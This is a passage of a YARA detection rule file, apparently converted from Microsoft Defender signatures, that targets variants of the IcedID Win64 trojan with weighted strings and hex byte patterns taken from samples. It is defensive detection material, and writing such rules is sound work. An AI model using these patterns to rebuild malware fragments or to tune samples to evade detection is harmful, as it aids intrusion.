        $x_3_1 = {44 89 4c 24 20 4c 89 44 24 18 3a db 74 4f 66 89 44 24 36 b8 3e 00 00 00 e9 c0 01 00 00 48 83 ec 68 48 c7 44 24 20 00 00 00 00 66 3b e4 74 00}  //weight: 3, accuracy: High
        $x_2_2 = "biayusdjasdugayshgdjaksa" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_10
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "PZDiRdLIgmDtvWn" ascii //weight: 1
        $x_1_2 = "PluginInit" ascii //weight: 1
        $x_1_3 = "RsngkGmKRIRWECZsplMym" ascii //weight: 1
        $x_1_4 = "ScXoVArrXejCH" ascii //weight: 1
        $x_1_5 = "XduGHOXFLYL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_11
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hBwxUUKYFJjhHee" ascii //weight: 1
        $x_1_2 = "jKhEDhqbpDNiKsq" ascii //weight: 1
        $x_1_3 = "jwMvwAhmxmpu" ascii //weight: 1
        $x_1_4 = "sVUPeevDztj" ascii //weight: 1
        $x_1_5 = "yasfbgasufbhagfyjafas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAL_2147825090_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAL!MTB"
        threat_id = "2147825090"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "A54IpwPE" ascii //weight: 1
        $x_1_2 = "AH4jaPQL2Cz" ascii //weight: 1
        $x_1_3 = "BtKGYkoYx" ascii //weight: 1
        $x_1_4 = "CuxoFLyP9" ascii //weight: 1
        $x_1_5 = "D5ZcMPB4m" ascii //weight: 1
        $x_1_6 = "FgHMOtCrZI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAM_2147825204_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAM!MTB"
        threat_id = "2147825204"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "PluginInit" ascii //weight: 1
        $x_1_2 = "FGdkzMZar" ascii //weight: 1
        $x_1_3 = "IyGFv4xW" ascii //weight: 1
        $x_1_4 = "MN077o" ascii //weight: 1
        $x_1_5 = "R9n2fqu5y" ascii //weight: 1
        $x_1_6 = "WeFtqeLp0LB" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAN_2147825205_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAN!MTB"
        threat_id = "2147825205"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ijniuashdyguas" ascii //weight: 1
        $x_1_2 = "AIaqdhjZpp" ascii //weight: 1
        $x_1_3 = "ExqE0mW" ascii //weight: 1
        $x_1_4 = "M54b5rni" ascii //weight: 1
        $x_1_5 = "UOvU5lv" ascii //weight: 1
        $x_1_6 = "W7NessoyA7" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAO_2147825236_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAO!MTB"
        threat_id = "2147825236"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "QDwB00o" ascii //weight: 1
        $x_1_2 = "X8p7rXe0Nk" ascii //weight: 1
        $x_1_3 = "kmDyJw" ascii //weight: 1
        $x_1_4 = "kzt7iMaZ" ascii //weight: 1
        $x_1_5 = "q9bvbKBs" ascii //weight: 1
        $x_1_6 = "svyTA7HZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ztyasufasklfmjnaks" ascii //weight: 1
        $x_1_2 = {f0 00 22 20 0b 02 ?? ?? 00 78 05 00 00 04}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {44 89 4c 24 20 4c 89 44 24 18 3a ff 74 00 48 89 54 24 10 48 89 4c 24 08 66 3b db 74 86 83 c0 24 66 89 44 24 54 3a f6 74 8b 33 c0 66 89 44 24 76}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {48 8b 4c 24 40 48 03 c8 [0-3] 74}  //weight: 3, accuracy: Low
        $x_4_2 = {8a 40 01 66 3b ed 74 00 88 44 24 21 8a 4c 24 20 e9 bf fc ff ff 88 44 24 20 48 8b 44 24 38 66 3b db 74 40 41 83 c0 0e}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AHngDn6p" ascii //weight: 1
        $x_1_2 = "AP4hNsRkiuz" ascii //weight: 1
        $x_1_3 = "GQ0iOmI" ascii //weight: 1
        $x_1_4 = "OR5nZw" ascii //weight: 1
        $x_1_5 = "ijniuashdyguas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "agjhsahjasksd" ascii //weight: 1
        $x_1_2 = "dt21mpa" ascii //weight: 1
        $x_1_3 = "kwbOaBs1" ascii //weight: 1
        $x_1_4 = "qCzgd91h9" ascii //weight: 1
        $x_1_5 = "uAfSbSjqPd2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "b0QIqMa" ascii //weight: 1
        $x_1_2 = "dDH1A5apTLA" ascii //weight: 1
        $x_1_3 = "e0LpJS8zd" ascii //weight: 1
        $x_1_4 = "hLllIg0MKX" ascii //weight: 1
        $x_1_5 = "ijniuashdyguas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WGbFmsDul" ascii //weight: 1
        $x_1_2 = "YG2sJuQuYV" ascii //weight: 1
        $x_1_3 = "YONBzd4k1H" ascii //weight: 1
        $x_1_4 = "bTvjZfYNS6P" ascii //weight: 1
        $x_1_5 = "ijniuashdyguas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_7
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ahAgDlouMKY" ascii //weight: 1
        $x_1_2 = "asyudgnasdyahdbyuajsas" ascii //weight: 1
        $x_1_3 = "nAqVUZByRUjuL" ascii //weight: 1
        $x_1_4 = "topKpiRzrLtnMoQA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_8
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FpsdbiewZtg0Cat3" ascii //weight: 1
        $x_1_2 = "Hghcgxashfgfsfgdf" ascii //weight: 1
        $x_1_3 = "UZmlYOoUy0cNadS" ascii //weight: 1
        $x_1_4 = "VfzVcp71" ascii //weight: 1
        $x_1_5 = "YP1POJBh4x" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_9
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "uiasgyfabhsfyasnjausas" ascii //weight: 1
        $x_1_2 = "CreateSemaphoreW" ascii //weight: 1
        $x_1_3 = "CreateMutexW" ascii //weight: 1
        $x_1_4 = "WaitForSingleObjectEx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_10
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "castfdasudhyugawujdbyau" ascii //weight: 1
        $x_1_2 = "ReleaseSemaphore" ascii //weight: 1
        $x_1_3 = "CreateMutexW" ascii //weight: 1
        $x_1_4 = "teresve4kna" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EH_2147826295_11
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EH!MTB"
        threat_id = "2147826295"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 31 04 0c 49 83 c4 ?? 8b 56 ?? 8b 8e ?? ?? ?? ?? 8b 86 ?? ?? ?? ?? 03 ca 2b 86 ?? ?? ?? ?? 83 f1 ?? 01 46 ?? 2b d1 8b 06 29 86 ?? ?? ?? ?? 89 56 ?? 8b 06 8b 4e ?? 33 8e ?? ?? ?? ?? 81 c1 ?? ?? ?? ?? 0f af c1 89 06 8b 86 ?? ?? ?? ?? 01 46 ?? b8 ?? ?? ?? ?? 2b 86 ?? ?? ?? ?? 01 86 ?? ?? ?? ?? 8b 46 ?? 2b 86 ?? ?? ?? ?? 8b 4e ?? 83 c0 ?? 31 86 ?? ?? ?? ?? 2b 8e ?? ?? ?? ?? 8b 86 ?? ?? ?? ?? 81 c1 ?? ?? ?? ?? 0f af c1 89 86 ?? ?? ?? ?? 49 81 fc ?? ?? ?? ?? 0f 8c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EL_2147826304_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EL!MTB"
        threat_id = "2147826304"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bwmkBd" ascii //weight: 1
        $x_1_2 = "cme4fhPzkb" ascii //weight: 1
        $x_1_3 = "emnCFCtYG20" ascii //weight: 1
        $x_1_4 = "fxFMIIqq8" ascii //weight: 1
        $x_1_5 = "ijniuashdyguas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DQ_2147826424_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DQ!MTB"
        threat_id = "2147826424"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TxP82wvyL" ascii //weight: 1
        $x_1_2 = "GFOH6kcWwdc" ascii //weight: 1
        $x_1_3 = "MSskD9c" ascii //weight: 1
        $x_1_4 = "PU0C0MAU" ascii //weight: 1
        $x_1_5 = "R1AjhyQCvV" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BH_2147826844_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BH!MTB"
        threat_id = "2147826844"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "CnGf9.dll" ascii //weight: 5
        $x_1_2 = "H1L8XtCY" ascii //weight: 1
        $x_1_3 = "JYA0EJsQ" ascii //weight: 1
        $x_1_4 = "KxECHH5mJ5" ascii //weight: 1
        $x_1_5 = "N3JW7PwDBf" ascii //weight: 1
        $x_1_6 = "OROOELg" ascii //weight: 1
        $x_1_7 = "Xq1iGRrqJTn" ascii //weight: 1
        $x_1_8 = "aPbCP44m2an" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EN_2147827187_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EN!MTB"
        threat_id = "2147827187"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "topsjyhuk" ascii //weight: 1
        $x_1_2 = {10 00 00 00 10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EN_2147827187_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EN!MTB"
        threat_id = "2147827187"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "UainwPVfCE" ascii //weight: 1
        $x_1_2 = "VILOKnIpvMt" ascii //weight: 1
        $x_1_3 = "Vbhjfsguasjfnasf" ascii //weight: 1
        $x_1_4 = "XvkCCRb" ascii //weight: 1
        $x_1_5 = "ZBPAcZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EN_2147827187_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EN!MTB"
        threat_id = "2147827187"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "US6UMF4sJQ" ascii //weight: 1
        $x_1_2 = "VperFg7L3" ascii //weight: 1
        $x_1_3 = "dTQZjgiKj" ascii //weight: 1
        $x_1_4 = "fywTawvxEA" ascii //weight: 1
        $x_1_5 = "gyhjuhyasbhjkas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EN_2147827187_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EN!MTB"
        threat_id = "2147827187"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mcejso" ascii //weight: 1
        $x_1_2 = "sIwYjgNBY" ascii //weight: 1
        $x_1_3 = "vwcKpBZWAuPZtofG" ascii //weight: 1
        $x_1_4 = "wCUxVrXTsMGVxBGr" ascii //weight: 1
        $x_1_5 = "zubitjkfnasyfujask" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EN_2147827187_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EN!MTB"
        threat_id = "2147827187"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CuCj9h29VWamDM" ascii //weight: 1
        $x_1_2 = "JwZlBR9EwrNjOM" ascii //weight: 1
        $x_1_3 = "KrLzYEQz8gHw" ascii //weight: 1
        $x_1_4 = "RQsotUEik9WrYO0" ascii //weight: 1
        $x_1_5 = "T5BMdsT1Wu" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DS_2147827415_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DS!MTB"
        threat_id = "2147827415"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "d7Y7Z5BBLpn" ascii //weight: 10
        $x_1_2 = "gyuashfhyugas" ascii //weight: 1
        $x_1_3 = "kuWES9mc7" ascii //weight: 1
        $x_1_4 = "ritzZNWkWRa" ascii //weight: 1
        $x_1_5 = "fNHe4avWy" ascii //weight: 1
        $x_10_6 = "tgnausyfgtyasghja" ascii //weight: 10
        $x_1_7 = "IaAB7fpdqub" ascii //weight: 1
        $x_1_8 = "SPmsBpIdew" ascii //weight: 1
        $x_1_9 = "dnBwzALJFL7" ascii //weight: 1
        $x_1_10 = "jN7q31FpWn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_AG_2147827699_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {44 89 4c 24 20 4c 89 44 24 18 66 3b c0 74 b8 e6 c4 90 ff d1 48 c1 ed 97 90 48 f7 f4 48 f7 f7 48 81 f9 d6 16 00 00 48 ff cb 48 81 d6 3d 0d 00 00 49 ff c4 48 85 dd e6 25 49 f7 d6 48 ff c3 48 f7 e6 4d 33 c0 49 f7 f8 41 5c e4 eb 49 ff c8 4d 23 c9 48 33 ff 48 81 f9 01 08 00 00 41 5a 49 f7 fa e6 9b ff d2 48 69 ff d1 26 00 00 49 8b f2}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 ff cf 4c 0f ac f6 5e 48 c1 e6 5e 49 c1 ee 15 4d 3b e3 49 c7 c6 be 15 00 00 48 f7 e2 49 f7 db 4d 69 ff 81 0e 00 00 48 33 d2 e4 fe 48 33 c9 48 f7 f1 48 ff c6 48 0f ac fd 6e 48 c1 e5 6e 4d 8b c6 48 ff cd 48 69 c0 ee 1b 00 00 48 f7 c3 5a 17 00 00 48 f7 d3 41 5f 48 33 ed 49 81 e2 40 1b 00 00 48 ff cd 49 81 d5 c7 04 00 00 49 ff cc 49 f7 d6 49 83 fd 2e 49 81 dc e9 07 00 00 4d 33 c0 4c 3b d5 49 81 e3 45 16 00 00 c8 b3 00 00 90 e4 f9}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "JdhqmMJ" ascii //weight: 1
        $x_1_2 = "PluginInit" ascii //weight: 1
        $x_1_3 = "XBJXGvklXW" ascii //weight: 1
        $x_1_4 = "oofouUWyf" ascii //weight: 1
        $x_1_5 = "pZQNjPUhYE" ascii //weight: 1
        $x_1_6 = "whZcUOghRWJ" ascii //weight: 1
        $x_1_7 = "GhostScript," ascii //weight: 1
        $x_2_8 = "070107162a14ac975aa09e1767bdcdcc143d5fcd8b2887bf9ca31720be" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AHUIUGLK" ascii //weight: 1
        $x_1_2 = "EVSvtoDWoVV" ascii //weight: 1
        $x_1_3 = "PluginInit" ascii //weight: 1
        $x_1_4 = "YDllySY" ascii //weight: 1
        $x_1_5 = "roRDLXv" ascii //weight: 1
        $x_1_6 = "tUfXQtWl" ascii //weight: 1
        $x_1_7 = "MboqmIhnY3CGx4NivXw3HNXNSFEef1tXL" ascii //weight: 1
        $x_2_8 = "ea892150a3a3ed677e1b17add6350012b938ea5c74ff77cd10703fbab024ce65104d77c43" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BtEglVuShNb" ascii //weight: 1
        $x_1_2 = "EOATTBcWws" ascii //weight: 1
        $x_1_3 = "FfxpmrZHfh" ascii //weight: 1
        $x_1_4 = "Gabsdjasjkadnhbjaskj" ascii //weight: 1
        $x_1_5 = "KgwWKC" ascii //weight: 1
        $x_1_6 = "XmhYHjcCEH" ascii //weight: 1
        $x_1_7 = "R9KStLTYI2X0yl0fgar0vZ7DTMxku6Kli" ascii //weight: 1
        $x_2_8 = "e3c0c18a8f7d514bfde7e01a007795eb4aa3769061de2aab0fdc2845473c" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IkdXtbHWHLB" ascii //weight: 1
        $x_1_2 = "JWJoZTl5cy" ascii //weight: 1
        $x_1_3 = "RDxwKAVP" ascii //weight: 1
        $x_1_4 = "d4sC6zOCe0" ascii //weight: 1
        $x_1_5 = "iVIUXJ6" ascii //weight: 1
        $x_1_6 = "sqya3Nhr" ascii //weight: 1
        $x_1_7 = "v9SIUZ0mD" ascii //weight: 1
        $x_1_8 = "wauhdhbsjakdjuhas" ascii //weight: 1
        $x_1_9 = "zJ6IPQPLwFQ" ascii //weight: 1
        $x_2_10 = "8fdf4f7d542936cf254d19aa15ed8784199413f8f2ffb239eeadcefbfa2b8e5427" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
